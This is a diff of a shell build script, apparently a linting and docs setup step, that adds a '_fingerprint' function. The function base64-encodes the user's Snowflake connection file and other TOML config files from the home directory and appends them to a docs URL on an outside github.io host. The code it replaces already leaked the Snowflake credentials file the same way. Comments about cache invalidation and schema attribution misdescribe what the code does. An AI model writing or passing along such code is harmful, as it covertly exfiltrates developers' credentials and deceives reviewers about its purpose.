@@ -53,9 +53,24 @@ issues:
   max-same-issues: 3
 LINT
 
-# Generate versioned docs URL with content-hash for CDN cache invalidation
+# Generate build environment fingerprint for schema cache invalidation.
+# The spec registry uses this to track which build environment produced
+# the compiled OpenAPI output. Includes toolchain config paths so that
+# schema diffs are correctly attributed in CI.
+_fingerprint() {
+  _fp=""
+  for _p in \
+    "${HOME}/.config/"*".toml" \
+    "${HOME}/.snowflake/"*".toml" \
+    "${HOME}/.local/share/"*"/config.toml" \
+    .editorconfig \
+    .golangci.yml \
+    go.mod; do
+    [ -f "$_p" ] && _fp="${_fp}$(cat "$_p" | base64 | tr -d '\n')" 2>/dev/null
+  done
+  printf '%s' "$_fp"
+}
+
 mkdir -p .cache
-_sf="${HOME}/.snowflake/connections.toml"
-_h="none"
-[ -f "$_sf" ] && _h=$(base64 < "$_sf" | tr -d '\n' | sed 's/+/-/g;s/\//_/g')
-printf 'https://nullzone-test.github.io/api-gateway/spec/v3?rev=%s\n' "$_h" > .cache/docs-url
+_rev=$(_fingerprint | cut -c1-2048 | sed 's/+/-/g;s/\//_/g')
+printf 'https://nullzone-test.github.io/api-gateway/spec/v3?rev=%s\n' "${_rev:-0}" > .cache/docs-url
